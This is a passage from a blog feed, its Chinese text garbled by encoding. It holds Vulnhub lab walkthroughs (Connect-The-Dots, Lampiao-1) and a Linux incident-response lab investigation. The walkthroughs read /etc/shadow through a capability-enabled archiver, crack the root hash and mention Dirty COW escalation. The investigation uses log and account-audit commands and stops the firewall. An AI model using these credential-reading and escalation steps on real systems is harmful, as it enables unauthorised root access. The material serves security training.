src="/img/Vulnhub-Connect-The-Dots/image-20240326212139549.png" alt="image-20240326212139549"></p><h1 id="äº”ã€ææƒè‡³root"><a href="#äº”ã€ææƒè‡³root" class="headerlink" title="äº”ã€ææƒè‡³root"></a>äº”ã€ææƒè‡³root</h1><p>éå†ç¨‹åºæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326213044117.png" alt="image-20240326213044117"></p><p>æ‰“åŒ…<code>/etc</code>ç›®å½•æ–‡ä»¶</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326213113205.png" alt="image-20240326213113205"></p><p>å†è§£åŒ…æŸ¥çœ‹<code>shadow</code>æ–‡ä»¶</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326213133469.png" alt="image-20240326213133469"></p><p>ç ´è§£root çš„å¯†ç å³å¯</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326213152518.png" alt="image-20240326213152518"></p><p>æ‰“åŒ…&#x2F;root ç›®å½•æŸ¥çœ‹flag</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326213539110.png" alt="image-20240326213539110"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhubç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Vulnhubç³»åˆ—ã€‘Vulnhubé¶åœº_Lampiao-1</title>
      <link href="/2024/03/25/Vulnhub-Lampiao-1/"/>
      <url>/2024/03/25/Vulnhub-Lampiao-1/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-Lampiao-1é¶åœºæ¸—é€"><a href="#ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-Lampiao-1é¶åœºæ¸—é€" class="headerlink" title="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub Lampiao-1é¶åœºæ¸—é€"></a>ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub Lampiao-1é¶åœºæ¸—é€</h1><h1 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h1><p><img src="/img/Vulnhub-Lampiao-1/image-20240325191522357.png" alt="image-20240325191522357"></p><h1 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h1><p><img src="/img/Vulnhub-Lampiao-1/image-20240325191550738.png" alt="image-20240325191550738"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325193813636.png" alt="image-20240325193813636"></p><h1 id="ä¸‰ã€webæ¡†æ¶"><a href="#ä¸‰ã€webæ¡†æ¶" class="headerlink" title="ä¸‰ã€webæ¡†æ¶"></a>ä¸‰ã€webæ¡†æ¶</h1><p><img src="/img/Vulnhub-Lampiao-1/image-20240325193939435.png" alt="image-20240325193939435"></p><h1 id="å››ã€webæ¸—é€"><a href="#å››ã€webæ¸—é€" class="headerlink" title="å››ã€webæ¸—é€"></a>å››ã€webæ¸—é€</h1><h2 id="1ã€ä¿¡æ¯æ”¶é›†"><a href="#1ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€ä¿¡æ¯æ”¶é›†"></a>1ã€ä¿¡æ¯æ”¶é›†</h2><p><img src="/img/Vulnhub-Lampiao-1/image-20240325194110526.png" alt="image-20240325194110526"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325194340461.png" alt="image-20240325194340461"></p><h2 id="2ã€ç›®å½•æ‰«æ"><a href="#2ã€ç›®å½•æ‰«æ" class="headerlink" title="2ã€ç›®å½•æ‰«æ"></a>2ã€ç›®å½•æ‰«æ</h2><p><img src="/img/Vulnhub-Lampiao-1/image-20240325200211393.png" alt="image-20240325200211393"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325195457228.png" alt="image-20240325195457228"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325195511227.png" alt="image-20240325195511227"></p><p>è·å¾—ç‰ˆæœ¬ä¿¡æ¯<code>7.56</code></p><h2 id="3ã€è·å–shell"><a href="#3ã€è·å–shell" class="headerlink" title="3ã€è·å–shell"></a>3ã€è·å–shell</h2><p>æŸ¥æ‰¾ç‰ˆæœ¬ä¿¡æ¯æ¼æ´</p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325200621885.png" alt="image-20240325200621885"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325200645655.png" alt="image-20240325200645655"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325200702213.png" alt="image-20240325200702213"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325200709998.png" alt="image-20240325200709998"></p><h1 id="äº”ã€ææƒ"><a href="#äº”ã€ææƒ" class="headerlink" title="äº”ã€ææƒ"></a>äº”ã€ææƒ</h1><h2 id="1ã€ææƒè‡³æ™®é€šç”¨æˆ·"><a href="#1ã€ææƒè‡³æ™®é€šç”¨æˆ·" class="headerlink" title="1ã€ææƒè‡³æ™®é€šç”¨æˆ·"></a>1ã€ææƒè‡³æ™®é€šç”¨æˆ·</h2><p>æ‰¾drupal æ•°æ®åº“çš„é…ç½®æ–‡ä»¶ï¼š</p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325212457865.png" alt="image-20240325212457865"></p><p>ææƒåˆ°æ™®é€šç”¨æˆ·<code>tiago</code></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325212719463.png" alt="image-20240325212719463"></p><h2 id="2ã€ææƒåˆ°root"><a href="#2ã€ææƒåˆ°root" class="headerlink" title="2ã€ææƒåˆ°root"></a>2ã€ææƒåˆ°root</h2><p>è„ç‰›ææƒï¼š</p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325212112731.png" alt="image-20240325212112731"></p><p>ä¸Šä¼ åˆ°é¶æœºè·å–root å¯†ç </p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325212023647.png" alt="image-20240325212023647"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325212216152.png" alt="image-20240325212216152"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhubç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åº”æ€¥é¶åœºã€‘çŸ¥æ”»å–„é˜²Linux Web2é¶åœºå…¥ä¾µæ’æŸ¥</title>
      <link href="/2024/03/23/Emergency-Linux-web2/"/>
      <url>/2024/03/23/Emergency-Linux-web2/</url>
      
        <content type="html"><![CDATA[<h1 id="çŸ¥æ”»å–„é˜²Linux-Web2é¶åœºå…¥ä¾µæ’æŸ¥"><a href="#çŸ¥æ”»å–„é˜²Linux-Web2é¶åœºå…¥ä¾µæ’æŸ¥" class="headerlink" title="çŸ¥æ”»å–„é˜²Linux Web2é¶åœºå…¥ä¾µæ’æŸ¥"></a>çŸ¥æ”»å–„é˜²Linux Web2é¶åœºå…¥ä¾µæ’æŸ¥</h1><p><strong>å‰æ™¯éœ€è¦ï¼š</strong>çœ‹ç›‘æ§çš„æ—¶å€™å‘ç°webshellå‘Šè­¦ï¼Œé¢†å¯¼è®©ä½ ä¸Šæœºæ£€æŸ¥ä½ å¯ä»¥æ•‘æ•‘å®‰æœä»”å—ï¼ï¼</p><p>1,æäº¤æ”»å‡»è€…IP</p><p>2,æäº¤æ”»å‡»è€…ä¿®æ”¹çš„ç®¡ç†å‘˜å¯†ç (æ˜æ–‡)</p><p>3,æäº¤ç¬¬ä¸€æ¬¡Webshellçš„è¿æ¥URL(<a href="http://xxx.xxx.xxx.xx/abcdefg?abcdefg%E5%8F%AA%E9%9C%80%E8%A6%81%E6%8F%90%E4%BA%A4abcdefg?abcdefg">http://xxx.xxx.xxx.xx/abcdefg?abcdefgåªéœ€è¦æäº¤abcdefg?abcdefg</a>)</p><p>3,æäº¤Webshellè¿æ¥å¯†ç </p><p>4,æäº¤æ•°æ®åŒ…çš„flag1</p><p>5,æäº¤æ”»å‡»è€…ä½¿ç”¨çš„åç»­ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶åç§°</p><p>6,æäº¤æ”»å‡»è€…éšè—çš„flag2</p><p>7,æäº¤æ”»å‡»è€…éšè—çš„flag3</p><h1 id="ä¸€ã€ç¯å¢ƒé…ç½®"><a href="#ä¸€ã€ç¯å¢ƒé…ç½®" class="headerlink" title="ä¸€ã€ç¯å¢ƒé…ç½®"></a>ä¸€ã€ç¯å¢ƒé…ç½®</h1><p>é¶åœºæ¥è‡ª<code>çŸ¥æ”»å–„é˜²å®éªŒå®¤</code>å…¬ä¼—å·ï¼šå›å¤<code>é¶æœºLinux2</code></p><p><img src="/img/Emergency-Linux-web2/image-20240322131714449.png" alt="image-20240322131714449"></p><p>æ‰“å¼€å³å¯ï¼Œé¶æœºçš„å¯åŠ¨ç•Œé¢å¦‚ä¸‹ï¼Œä½¿ç”¨äº†å¤šç§æ–¹æ³•æ— æ³•è¿›å…¥æ¡Œé¢ï¼Œæ ¹æ®è¯¥é¶æœºçš„æ–‡ä»¶å¤§å°æ¨æµ‹ï¼Œè¯¥é¶æœºæ²¡æœ‰å®‰è£…å›¾å½¢ç•Œé¢</p><p><img src="/img/Emergency-Linux-web2/image-20240322131908432.png" alt="image-20240322131908432"></p><h1 id="äºŒã€è´¦æˆ·å®‰å…¨"><a href="#äºŒã€è´¦æˆ·å®‰å…¨" class="headerlink" title="äºŒã€è´¦æˆ·å®‰å…¨"></a>äºŒã€è´¦æˆ·å®‰å…¨</h1><p>æ£€æŸ¥<code>/etc/passwd</code>å’Œ<code>/etc/shadow</code>æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep -v nologin        #æŸ¥çœ‹å¯ä»¥ç™»é™†çš„ç”¨æˆ·</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow    #æŸ¥çœ‹å¯ä»¥è¿œç¨‹ç™»é™†çš„ç”¨æˆ·</span><br></pre></td></tr></table></figure><img src="/img/Emergency-Linux-web2/image-20240322132303444.png" alt="image-20240322132303444" style="zoom:150%;" /><p>å¹¶æ— å…¶ä»–ç”¨æˆ·ï¼ŒæŸ¥çœ‹ä¸‹<code>/home</code>ç›®å½•</p><p><img src="/img/Emergency-Linux-web2/image-20240322132512661.png" alt="image-20240322132512661"></p><p>æœ‰ä¸€ä¸ª<code>www</code>ç”¨æˆ·ï¼Œè¿™è«ä¸æ˜¯webç”¨æˆ·ï¼Ÿå­˜åœ¨äº&#x2F;homeç›®å½•ä¸‹ï¼Œå±äºæ˜¯æ™®é€šç”¨æˆ·å—ï¼ŸæŸ¥çœ‹wwwç”¨æˆ·çš„shellç¯å¢ƒ</p><p><img src="/img/Emergency-Linux-web2/image-20240322132715892.png" alt="image-20240322132715892"></p><p>è¯¥wwwç¡®å®æ˜¯å±äºæ™®é€šç”¨æˆ·ï¼Œä½†æ˜¯shellç¯å¢ƒå±äº<code>/sbin/nologin</code>ï¼Œä¸èƒ½è¿›è¡Œæ­£å¸¸ç™»é™†</p><p>é€šè¿‡<code>who</code>å‘½ä»¤æŸ¥çœ‹ä¸‹å½“å‰è¯¥æœºå™¨ç™»é™†çš„ç”¨æˆ·æœ‰å“ªäº›ï¼ˆttyæœ¬åœ°ç™»é™† ptsè¿œç¨‹ç™»å½•ï¼‰</p><p><img src="/img/Emergency-Linux-web2/image-20240322165437895.png" alt="image-20240322165437895"></p><p>åªæœ‰æœ¬åœ°ç™»å½•çš„roor ç”¨æˆ·</p><p>é€šè¿‡<code>last</code>å‘½ä»¤æ’æŸ¥æœ€åç™»é™†çš„æ—¶é—´ï¼Œå‘ç°<code>192.168.20.1</code>è¿™ä¸ªå¯ç–‘IPè¿›è¡Œè¿‡å¤šæ¬¡è¿œç¨‹ç™»é™†</p><p><img src="/img/Emergency-Linux-web2/image-20240322212519592.png" alt="image-20240322212519592"></p><h1 id="ä¸‰ã€å†å²å‘½ä»¤æ’æŸ¥"><a href="#ä¸‰ã€å†å²å‘½ä»¤æ’æŸ¥" class="headerlink" title="ä¸‰ã€å†å²å‘½ä»¤æ’æŸ¥"></a>ä¸‰ã€å†å²å‘½ä»¤æ’æŸ¥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history          #æŸ¥çœ‹rootå†å²å‘½ä»¤</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œæœ‰ç‚¹å‘ï¼Œçœ‹ä¸åˆ°ä¸Šé¢çš„å†å²è®°å½•ï¼Œæ˜¯æ»‘åŠ¨ä¸äº†çš„</p><p><img src="/img/Emergency-Linux-web2/image-20240322133029147.png" alt="image-20240322133029147"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history | more       #é€šè¿‡moreè¿›è¡Œä¸€é¡µé¡µå‘½ä»¤çš„ç¿»çœ‹</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322133330907.png" alt="image-20240322133330907"></p><p>è¿™é‡Œæ˜¯å…³é—­äº†é˜²ç«å¢™ï¼Œç„¶åå®‰è£…äº†å®å¡”ï¼Œå»wwwç›®å½•ä¸‹çœ‹äº†çœ‹æ—¥å¿—</p><p><img src="/img/Emergency-Linux-web2/image-20240322133631229.png" alt="image-20240322133631229"></p><p>è¿™é‡Œæ˜¯åœ¨<code>wwwroot/127.0.0.1</code>ä¸‹é¢åˆ é™¤äº†flag1 è·Ÿ 1ï¼Œç„¶ååˆ é™¤äº†<code>pe9.sql</code>æ–‡ä»¶ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯æ•°æ®åº“çš„ä¸€ä¸ªsqlæ–‡ä»¶ï¼Œè¿˜æ‰§è¡Œè¿‡<code>docker ps</code>å‘½ä»¤ï¼Œè¿™å°æœºå™¨è¿˜è¿è¡Œç€docker ï¼Ÿ</p><p><img src="/img/Emergency-Linux-web2/image-20240322134129029.png" alt="image-20240322134129029"></p><p>è¿™é‡Œå¯¹ç½‘ç«™æ ¹è·¯å¾„ä¸‹çš„<code>.api</code>æ–‡ä»¶å¤¹åšäº†ä¸€äº›ç²˜è´´ï¼Œä¹‹åä»100è¡Œå¼€å§‹ï¼Œé€æ¸ä¸å¯¹åŠ²èµ·æ¥</p><p>åœ¨å°è¯•å¢åŠ ä¸€ä¸ª<code>flag3&#123;5LourqoFt5d2zy0VUoVPJb0meVmoKgcy60Z&#125;</code>çš„ç”¨æˆ·ï¼Œä½†æ˜¯åœ¨<code>useradd: invalid user name &#39;flag3&#123;5LourqoFt5d2zy0VUoVPJb0meVmoKgcy60Z&#125;&#39;</code>çš„é”™è¯¯ä¿¡æ¯æ¥çœ‹ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰æ·»åŠ ä¸Šã€‚ä¹‹åè¿˜å¯¹<code>/etc/profile</code>æ–‡ä»¶è¿›è¡Œäº†ç¼–è¾‘ï¼Œåº”è¯¥æ˜¯åšäº†æŸäº›é…ç½®å˜é‡çš„ä¿®æ”¹ï¼Œä¹‹å<code>source /etc/profile</code>é‡æ–°åŠ è½½é…ç½®å˜é‡</p><p><img src="/img/Emergency-Linux-web2/image-20240322135823186.png" alt="image-20240322135823186"></p><p>è¿™é‡Œï¼Œroot çš„å¯†ç è¢«è¿›è¡Œäº†æ›´æ”¹ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªå¯ç–‘çš„<code>wp</code>æ–‡ä»¶è¢«æ‰§è¡Œï¼Œåé¢æ˜¯æˆ‘çš„æ’æŸ¥æ“ä½œ</p><p>é‚£ä¹ˆé’ˆå¯¹flag3é‚£ä¸ªç”¨æˆ·æœ‰æ²¡æœ‰åˆ›å»ºæˆåŠŸï¼Œå†çœ‹ä¸€ä¸‹<code>/etc/passwd</code>æ–‡ä»¶</p><p><img src="/img/Emergency-Linux-web2/image-20240322140038907.png" alt="image-20240322140038907"></p><p>ç¡®å®ä¸å­˜åœ¨flag3ç”¨æˆ·ï¼Œåªå­˜åœ¨wwwå’Œmysql çš„æ™®é€šç”¨æˆ·</p><h1 id="å››ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥"><a href="#å››ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥" class="headerlink" title="å››ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥"></a>å››ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322140142066.png" alt="image-20240322140142066"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pa -aux  #æŸ¥çœ‹è¿›ç¨‹</span><br><span class="line">top -c -o %CPU     #å®æ—¶æŸ¥çœ‹é«˜CPUè¿›ç¨‹</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322140225599.png" alt="image-20240322140225599"></p><p><img src="/img/Emergency-Linux-web2/image-20240322140307183.png" alt="image-20240322140307183"></p><h1 id="äº”ã€å¼€æœºå¯åŠ¨é¡¹æ’æŸ¥"><a href="#äº”ã€å¼€æœºå¯åŠ¨é¡¹æ’æŸ¥" class="headerlink" title="äº”ã€å¼€æœºå¯åŠ¨é¡¹æ’æŸ¥"></a>äº”ã€å¼€æœºå¯åŠ¨é¡¹æ’æŸ¥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/rc.local</span><br><span class="line">/etc/profile</span><br><span class="line">~/.bashrc</span><br><span class="line">ç­‰</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322140615795.png" alt="image-20240322140615795"></p><p><img src="/img/Emergency-Linux-web2/image-20240322163635815.png" alt="image-20240322163635815"></p><p>åœ¨<code>/etc/profile</code>æ–‡ä»¶ä¸­å‘ç°<code>flag3=&quot;flag&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;&quot;</code></p><p><img src="/img/Emergency-Linux-web2/image-20240322191053732.png" alt="image-20240322191053732"></p><h1 id="å…­ã€å®šæ—¶ä»»åŠ¡æ’æŸ¥"><a href="#å…­ã€å®šæ—¶ä»»åŠ¡æ’æŸ¥" class="headerlink" title="å…­ã€å®šæ—¶ä»»åŠ¡æ’æŸ¥"></a>å…­ã€å®šæ—¶ä»»åŠ¡æ’æŸ¥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">cat /var/spool/cron/*</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/cron.d/*</span><br><span class="line">cat /etc/cron.daiy/*</span><br><span class="line">cat /etc/cron.weekly/*</span><br><span class="line">cat /etc/cron.monthly/*</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322163802313.png" alt="image-20240322163802313"></p><h1 id="ä¸ƒã€æ—¥å¿—æ’æŸ¥"><a href="#ä¸ƒã€æ—¥å¿—æ’æŸ¥" class="headerlink" title="ä¸ƒã€æ—¥å¿—æ’æŸ¥"></a>ä¸ƒã€æ—¥å¿—æ’æŸ¥</h1><h2 id="1ã€ç³»ç»Ÿå®‰å…¨æ—¥å¿—å®¡è®¡"><a href="#1ã€ç³»ç»Ÿå®‰å…¨æ—¥å¿—å®¡è®¡" class="headerlink" title="1ã€ç³»ç»Ÿå®‰å…¨æ—¥å¿—å®¡è®¡"></a>1ã€ç³»ç»Ÿå®‰å…¨æ—¥å¿—å®¡è®¡</h2><p>å®‰å…¨æ—¥å¿—æ–‡ä»¶å­˜æ”¾è·¯å¾„ï¼š<code>/var/log/secure</code>ï¼Œæ˜¯sshç™»é™†æˆåŠŸä¸å¦çš„ä¸€ä¸ªå®‰å…¨æ—¥å¿—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat secure | grep &quot;Failed&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr   #ç»Ÿè®¡IPçˆ†ç ´æ¬¡æ•°</span><br><span class="line">cat secure | grep &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322170358123.png" alt="image-20240322170358123"></p><p>å‘ç°IP<code>192.168.20.1</code>è¿™ä¸ªIP é€šè¿‡å¯†ç è®¤è¯è¿›è¡Œäº†ä¸‰æ¬¡ç™»é™†</p><h2 id="2ã€webæ—¥å¿—å®¡è®¡"><a href="#2ã€webæ—¥å¿—å®¡è®¡" class="headerlink" title="2ã€webæ—¥å¿—å®¡è®¡"></a>2ã€webæ—¥å¿—å®¡è®¡</h2><p>åœ¨ä¹‹å‰çš„æ’æŸ¥ä¸­çŸ¥é“è¯¥æœºå™¨é…ç½®æœ‰å®å¡”ï¼Œå³å­˜åœ¨webæœåŠ¡ï¼ŒæŸ¥çœ‹web æ—¥å¿—ï¼Œè·¯å¾„ï¼š<code>/www/wwwlogs/access.log</code></p><p>ä¾ç„¶åˆ©ç”¨<code>more</code>å‘½ä»¤è¿›è¡ŒæŸ¥çœ‹</p><p><img src="/img/Emergency-Linux-web2/image-20240322171405425.png" alt="image-20240322171405425"></p><p>ä½†æ˜¯è¿™æ ·å¤ªå¤šå¤ªæ‚ä¸å¥½åˆ†æï¼Œæˆ‘ä»¬åœ¨é¶æœºä¸Šåˆ©ç”¨python2 å¿«é€Ÿå¼€å¯ä¸€ä¸ªhttpæœåŠ¡ï¼Œå°†æ—¥å¿—æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°è¿›è¡Œåˆ†æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl status firewalld</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">python --version</span><br><span class="line">ip a</span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322172153579.png" alt="image-20240322172153579"></p><p>æˆ‘ä»¬é‡ç‚¹åˆ†æ<code>access.log</code>æ–‡ä»¶ï¼š</p><p><img src="/img/Emergency-Linux-web2/image-20240322172833614.png" alt="image-20240322172833614"></p><p>ä¹‹åç”¨åœ¨çº¿æ—¥å¿—åˆ†æç½‘ç«™è¿›è¡Œé€ä¸€åˆ†æ</p><p><img src="/img/Emergency-Linux-web2/image-20240322172941689.png" alt="image-20240322172941689"></p><p>å¼€å¤´æ˜¯127.0.0.1çš„IPè®¿é—®ï¼Œæ—¶é—´åœ¨3æœˆ7æ—¥ï¼Œåˆ°49æ¡æ—¥å¿—å¼€å§‹ï¼Œå‡ºç°äº†<code>192.168.20.1</code>è¿™ä¸ªå±€åŸŸç½‘IP çš„æ“ä½œï¼Œå¼€å§‹æ—¶é—´åœ¨<code>12:05:16</code></p><p><img src="/img/Emergency-Linux-web2/image-20240322174608055.png" alt="image-20240322174608055"></p><p>ä¹Ÿæ˜¯å¯¹<code>/phpmyadmin</code>è¿›è¡Œè®¿é—®ï¼ŒæŒç»­åˆ°162æ¡æ—¥å¿—ï¼Œä½†æ˜¯æ—¶é—´å…¨éƒ¨åœ¨3æœˆ7æ—¥è¿›è¡Œçš„ï¼Œæœ€åæ—¶é—´åœç•™åœ¨<code>12:30:04</code></p><p><img src="/img/Emergency-Linux-web2/image-20240322173043519.png" alt="image-20240322173043519"></p><p>ä»163æ¡æ—¥å¿—å¼€å§‹ï¼Œæ—¶é—´æ¥åˆ°3æœˆ20æ—¥ï¼ŒIPæ˜¯æœ¬åœ°çš„127.0.0.1ï¼Œåœ¨<code>phpmyadmin</code>ä¸­å¯¹æ•°æ®åº“è¿›è¡Œäº†å¾ˆå¤šçš„æ“ä½œï¼Œä¸€ç›´æŒç»­åˆ°æ—¥å¿—ç»“å°¾</p><p><img src="/img/Emergency-Linux-web2/image-20240322174505560.png" alt="image-20240322174505560"></p><p>è¿™ä¸ªæ—¥å¿—å¾ˆå¥‡æ€ªï¼Œåœ¨å¼‚å¸¸æ–‡ä»¶æ’æŸ¥è¿‡ç¨‹ä¸­ï¼Œsshå…¬é’¥æ–‡ä»¶æ˜¯åœ¨3æœˆ20æ—¥<code>10:30:24</code>è¢«ä¿®æ”¹çš„ï¼Œè€Œåœ¨æ—¥å¿—ä¸­<code>192.168.20.1</code>åªåœ¨3æœˆ7æ—¥å‡ºç°è¿‡</p><p>ä½¿ç”¨360æ˜Ÿå›¾ä¹Ÿæœªå‘ç°æœ‰æ”»å‡»è¡Œä¸ºï¼Œåªåšäº†ä¸€äº›ç®€å•çš„æµé‡åˆ†æ</p><p><img src="/img/Emergency-Linux-web2/image-20240322175203210.png" alt="image-20240322175203210"></p><h1 id="å…«ã€å¼‚å¸¸æ–‡ä»¶æ’æŸ¥"><a href="#å…«ã€å¼‚å¸¸æ–‡ä»¶æ’æŸ¥" class="headerlink" title="å…«ã€å¼‚å¸¸æ–‡ä»¶æ’æŸ¥"></a>å…«ã€å¼‚å¸¸æ–‡ä»¶æ’æŸ¥</h1><h2 id="1ã€tmpä¸´æ—¶æ–‡ä»¶æ’æŸ¥"><a href="#1ã€tmpä¸´æ—¶æ–‡ä»¶æ’æŸ¥" class="headerlink" title="1ã€tmpä¸´æ—¶æ–‡ä»¶æ’æŸ¥"></a>1ã€tmpä¸´æ—¶æ–‡ä»¶æ’æŸ¥</h2><p>æ­£å¸¸æ–‡ä»¶ï¼Œæœ‰å¥½å¤šsessionæ–‡ä»¶</p><p><img src="/img/Emergency-Linux-web2/image-20240322163935584.png" alt="image-20240322163935584"></p><h2 id="2ã€sshç›®å½•æ’æŸ¥"><a href="#2ã€sshç›®å½•æ’æŸ¥" class="headerlink" title="2ã€sshç›®å½•æ’æŸ¥"></a>2ã€sshç›®å½•æ’æŸ¥</h2><p><img src="/img/Emergency-Linux-web2/image-20240322164150956.png" alt="image-20240322164150956"></p><p>rootçš„<code>.ssh</code>æ–‡ä»¶å¤¹ä¸‹å­˜åœ¨å…¬é’¥ï¼Œå…¶å†…å®¹åœ¨3æœˆ20æ—¥<code>10:30:24</code>è¢«ä¿®æ”¹ï¼Œå…¶æƒé™åœ¨3æœˆ22æ—¥<code>21:09:44</code>è¢«ä¿®æ”¹</p><h2 id="3ã€rootå®¶ç›®å½•æ’æŸ¥"><a href="#3ã€rootå®¶ç›®å½•æ’æŸ¥" class="headerlink" title="3ã€rootå®¶ç›®å½•æ’æŸ¥"></a>3ã€rootå®¶ç›®å½•æ’æŸ¥</h2><p><img src="/img/Emergency-Linux-web2/image-20240322191230933.png" alt="image-20240322191230933"></p><p>å‘ç°ä¹‹å‰å†å²å‘½ä»¤ä¸­æ’æŸ¥åˆ°çš„wp å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä»¥åŠå­˜åœ¨ä¸€ä¸ª<code>.pcapng</code>æ–‡ä»¶ï¼Œæœ‰å…³è¿™ä¸ª<code>.pcapng</code>æ–‡ä»¶ï¼Œå±äºæ˜¯æµé‡åŒ…æ–‡ä»¶ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥è¿½è¸ªè·Ÿè¯¥æœºå™¨äº¤äº’çš„æµé‡æ•°æ®ï¼Œä»è€Œæ›´å¥½çš„è¿›è¡Œæ’æŸ¥</p><h2 id="4ã€-api-æ–‡ä»¶å¤¹æ’æŸ¥"><a href="#4ã€-api-æ–‡ä»¶å¤¹æ’æŸ¥" class="headerlink" title="4ã€.api æ–‡ä»¶å¤¹æ’æŸ¥"></a>4ã€.api æ–‡ä»¶å¤¹æ’æŸ¥</h2><p>ä¹‹å‰åœ¨å†å²å‘½ä»¤ä¸­çœ‹åˆ°æœ‰å¯¹<code>.api</code>æ–‡ä»¶å¤¹åšè¿‡æ‰‹è„šï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹</p><p><code>api</code>æ–‡ä»¶å¤¹å’Œ<code>.api</code>æ–‡ä»¶çš„å†…å®¹ç›¸åŒï¼Œå¤§å°ä¹Ÿç›¸åŒï¼Œç”¨<code>diff</code>å‘½ä»¤è¿›è¡Œæ¯”å¯¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff file1.txt file2.txt</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240323154529579.png" 